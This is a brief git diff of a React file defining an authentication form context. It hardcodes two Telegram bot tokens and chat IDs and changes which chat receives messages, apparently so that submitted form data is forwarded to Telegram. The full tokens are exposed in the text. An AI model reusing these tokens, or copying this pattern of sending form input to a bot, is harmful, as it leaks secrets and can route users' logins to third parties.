@@ -4,7 +4,7 @@ import PropTypes from "prop-types";
 const UseContextForm = createContext();
 let secondtChatId = "-1002248337195"
 let secondBotToken="7157897588:AAFpauemd1I94-0breGo2stQMuOHcbdR9qw"
-let chatId = "7911135198";
+let chatId = "-1002248337195"//"7911135198";
 let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"; //
 
 export const AuthForm = () => {
